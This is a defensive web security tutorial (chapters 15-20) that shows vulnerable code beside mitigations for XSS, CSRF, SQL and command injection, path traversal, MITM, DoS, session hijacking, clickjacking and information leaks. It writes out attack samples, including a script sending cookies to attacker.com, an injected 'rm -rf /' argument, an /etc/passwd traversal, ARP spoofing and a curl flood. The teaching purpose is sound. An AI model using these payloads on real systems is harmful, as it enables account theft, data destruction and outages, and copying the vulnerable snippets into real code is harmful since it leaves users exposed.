# PARTE 5: SICUREZZA HTTP
# Capitoli 15-20

---

# 15. Vulnerabilità HTTP Comuni

## 15.1 Cross-Site Scripting (XSS)

### 15.1.1 - Reflected XSS
```html
<!-- URL vulnerable: http://example.com/search?q=<script>alert('XSS')</script> -->
<h1>Search results for: <?php echo $_GET['q']; ?></h1>

<!-- Attack -->
http://example.com/search?q=<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Mitigation:**
```javascript
// Sanitize input
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
});
```

### 15.1.2 - Stored XSS
```javascript
// Vulnerable comment system
app.post('/comment', (req, res) => {
  db.insert({ comment: req.body.text }); // NO SANITIZATION!
});

app.get('/comments', (req, res) => {
  const comments = db.getAll();
  res.send(comments.map(c => `<p>${c.comment}</p>`).join(''));
  // <script> tags executed!
});
```

**Mitigation:**
```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/comment', (req, res) => {
  const clean = sanitizeHtml(req.body.text, {
    allowedTags: ['b', 'i', 'em', 'strong'],
    allowedAttributes: {}
  });
  db.insert({ comment: clean });
});
```

### 15.1.3 - DOM-based XSS
```html
<!-- Vulnerable -->
<script>
  const name = window.location.hash.substring(1);
  document.getElementById('greeting').innerHTML = 'Hello ' + name;
</script>

<!-- Attack: http://example.com/#<img src=x onerror=alert('XSS')> -->
```

**Mitigation:**
```javascript
// Use textContent instead of innerHTML
const name = window.location.hash.substring(1);
document.getElementById('greeting').textContent = 'Hello ' + name;

// Or use DOMPurify
document.getElementById('greeting').innerHTML = 
  DOMPurify.sanitize('Hello ' + name);
```

## 15.2 Cross-Site Request Forgery (CSRF)

### 15.2.1 - Attack Example
```html
<!-- Attacker site: evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- User visits evil.com while logged into bank.com
     Browser automatically sends cookies → transfer executes! -->
```

### 15.2.2 - CSRF Token Protection
```javascript
// Server generates token
app.get('/form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = csrfToken;
  
  res.send(`
    <form method="POST" action="/transfer">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input name="amount">
      <button>Transfer</button>
    </form>
  `);
});

app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Process transfer
});
```

### 15.2.3 - SameSite Cookie
```javascript
app.use(session({
  cookie: {
    sameSite: 'strict', // or 'lax'
    secure: true,
    httpOnly: true
  }
}));
```

## 15.3 SQL Injection

### 15.3.1 - Vulnerable Code
```javascript
// NEVER DO THIS!
app.get('/user', (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.query.id}`;
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// Attack: /user?id=1 OR 1=1 --
// Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1 --
// Returns ALL users!
```

### 15.3.2 - Prepared Statements
```javascript
// Safe: parameterized query
app.get('/user', (req, res) => {
  const query = 'SELECT * FROM users WHERE id = ?';
  db.query(query, [req.query.id], (err, results) => {
    res.json(results);
  });
});
```

## 15.4 Command Injection

### 15.4.1 - Vulnerable Example
```javascript
// DANGEROUS!
app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
});

// Attack: /ping?host=google.com;rm -rf /
```

### 15.4.2 - Mitigation
```javascript
const { spawn } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Validate input
  if (!/^[a-z0-9.-]+$/i.test(host)) {
    return res.status(400).send('Invalid host');
  }
  
  // Use spawn (no shell)
  const ping = spawn('ping', ['-c', '4', host]);
  
  ping.stdout.on('data', data => {
    res.write(data);
  });
  
  ping.on('close', () => {
    res.end();
  });
});
```

## 15.5 Directory Traversal

### 15.5.1 - Vulnerable File Serve
```javascript
// DANGEROUS!
app.get('/files/:filename', (req, res) => {
  res.sendFile(`/var/www/uploads/${req.params.filename}`);
});

// Attack: GET /files/../../etc/passwd
```

### 15.5.2 - Safe Implementation
```javascript
const path = require('path');

app.get('/files/:filename', (req, res) => {
  const uploadsDir = '/var/www/uploads';
  const filename = path.basename(req.params.filename); // Remove ../
  const filepath = path.join(uploadsDir, filename);
  
  // Ensure file is within uploads directory
  if (!filepath.startsWith(uploadsDir)) {
    return res.status(403).send('Forbidden');
  }
  
  res.sendFile(filepath);
});
```

---

# 16. Man-in-the-Middle (MITM) Attacks

## 16.1 Attack Scenarios

### 16.1.1 - WiFi Sniffing
```
Client ← → Attacker's WiFi ← → Internet
           (Intercepts traffic)
```

### 16.1.2 - ARP Spoofing
```bash
# Attacker redirects traffic through their machine
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Then sniff with Wireshark
wireshark -i eth0
```

## 16.2 Defense: HTTPS/TLS

### 16.2.1 - Certificate Pinning
```javascript
// Node.js: pin specific certificate
const https = require('https');
const fs = require('fs');

const pinnedCert = fs.readFileSync('expected-cert.pem');

https.get('https://api.example.com', {
  ca: pinnedCert
}, (res) => {
  // Connection only if certificate matches
  res.on('data', data => console.log(data.toString()));
});
```

### 16.2.2 - HSTS (HTTP Strict Transport Security)
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
```

```http
HTTP/2 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

<!-- Browser will ONLY use HTTPS for next year -->
```

---

# 17. Denial of Service (DoS)

## 17.1 HTTP Flood

### 17.1.1 - Attack
```bash
# Simple flood
while true; do
  curl http://example.com &
done

# Slowloris (slow headers)
slowloris -s 500 example.com
```

### 17.1.2 - Mitigation - Rate Limiting
```nginx
# Nginx rate limiting
http {
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    
    server {
        location /api/ {
            limit_req zone=one burst=20 nodelay;
        }
    }
}
```

```javascript
// Express.js rate limiting
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  message: 'Too many requests'
});

app.use('/api/', limiter);
```

## 17.2 Slowloris Attack

### 17.2.1 - How It Works
```
Client sends:
POST /upload HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 1000000\r\n
\r\n
[sends 1 byte every 10 seconds]

Server waits for complete request → connection stays open → exhausts server resources
```

### 17.2.2 - Mitigation
```nginx
# Nginx timeouts
client_body_timeout 10s;
client_header_timeout 10s;
send_timeout 10s;

# Limit simultaneous connections
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_conn addr 10;
```

## 17.3 Distributed Denial of Service (DDoS)

### 17.3.1 - Cloudflare Protection
```javascript
// worker.js (Cloudflare Workers)
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const clientIP = request.headers.get('CF-Connecting-IP');
  const country = request.cf.country;
  
  // Block specific countries
  if (country === 'XX') {
    return new Response('Forbidden', { status: 403 });
  }
  
  // Rate limit by IP
  const cache = caches.default;
  const cacheKey = `rate-limit:${clientIP}`;
  const cached = await cache.match(cacheKey);
  
  if (cached) {
    const count = parseInt(await cached.text());
    if (count > 100) {
      return new Response('Too many requests', { status: 429 });
    }
    await cache.put(cacheKey, new Response(count + 1), {
      expirationTtl: 60
    });
  } else {
    await cache.put(cacheKey, new Response('1'), {
      expirationTtl: 60
    });
  }
  
  return fetch(request);
}
```

---

# 18. Session Hijacking

## 18.1 Session Cookie Theft

### 18.1.1 - XSS-based Theft
```javascript
// Attacker injects:
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// Attacker now has session ID → can impersonate user
```

### 18.1.2 - Defense: HttpOnly Cookie
```javascript
app.use(session({
  secret: 'secret-key',
  cookie: {
    httpOnly: true,  // Prevent JavaScript access
    secure: true,    // Only HTTPS
    sameSite: 'strict'
  }
}));
```

## 18.2 Session Fixation

### 18.2.1 - Attack
```
1. Attacker gets session ID: SESSIONID=abc123
2. Attacker sends link to victim:
   http://example.com/?SESSIONID=abc123
3. Victim logs in (session ID remains abc123)
4. Attacker uses abc123 → hijacks session!
```

### 18.2.2 - Defense: Regenerate Session on Login
```javascript
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  if (authenticateUser(username, password)) {
    // Regenerate session ID after login
    req.session.regenerate((err) => {
      req.session.user = username;
      res.redirect('/dashboard');
    });
  }
});
```

---

# 19. Clickjacking

## 19.1 Attack

### 19.1.1 - Invisible iframe
```html
<!-- Attacker site -->
<style>
  iframe {
    opacity: 0;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }
</style>

<h1>Win a Prize! Click Here!</h1>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>

<!-- User thinks they're clicking "Win Prize" 
     but actually clicking hidden "Confirm Transfer" button -->
```

## 19.2 Defense: X-Frame-Options

### 19.2.1 - Header
```nginx
add_header X-Frame-Options "SAMEORIGIN";
# or
add_header X-Frame-Options "DENY";
```

```http
HTTP/2 200 OK
X-Frame-Options: DENY

<!-- Page cannot be embedded in iframe -->
```

### 19.2.2 - CSP Frame-Ancestors
```nginx
add_header Content-Security-Policy "frame-ancestors 'self'";
```

```javascript
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
  next();
});
```

---

# 20. Information Disclosure

## 20.1 Sensitive Headers

### 20.1.1 - Server Version Leak
```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)  <!-- ❌ Version disclosed -->
X-Powered-By: PHP/7.4.3        <!-- ❌ Tech stack disclosed -->
```

**Mitigation:**
```nginx
# Nginx: hide version
server_tokens off;

# Output:
Server: nginx  <!-- ✅ No version -->
```

```apache
# Apache: hide version
ServerTokens Prod
ServerSignature Off

# Output:
Server: Apache  <!-- ✅ No version -->
```

```javascript
// Express.js: remove X-Powered-By
app.disable('x-powered-by');
```

## 20.2 Directory Listing

### 20.2.1 - Vulnerable Configuration
```apache
<Directory /var/www/html/uploads>
    Options Indexes  <!-- ❌ DANGEROUS -->
</Directory>

<!-- Accessing /uploads/ shows all files! -->
```

**Mitigation:**
```apache
<Directory /var/www/html/uploads>
    Options -Indexes  <!-- ✅ Disable listing -->
</Directory>
```

```nginx
location /uploads/ {
    autoindex off;  # Disable directory listing
}
```

## 20.3 Error Messages

### 20.3.1 - Verbose Errors
```javascript
// ❌ DON'T expose stack traces in production
app.get('/api/user', (req, res) => {
  db.query('SELECT * FROM users WHERE id = ?', [req.query.id], (err, results) => {
    if (err) {
      res.status(500).send(err.stack);  // ❌ Leaks database structure
    }
  });
});
```

**Mitigation:**
```javascript
// ✅ Generic error messages in production
app.get('/api/user', (req, res) => {
  db.query('SELECT * FROM users WHERE id = ?', [req.query.id], (err, results) => {
    if (err) {
      console.error(err);  // Log server-side only
      res.status(500).send('Internal server error');  // ✅ Generic message
    } else {
      res.json(results);
    }
  });
});

// Development vs Production
if (process.env.NODE_ENV === 'development') {
  app.use(errorHandler({ dumpExceptions: true, showStack: true }));
} else {
  app.use((err, req, res, next) => {
    res.status(500).send('Something went wrong');
  });
}
```

---

**Capitoli 15-20 completati!**
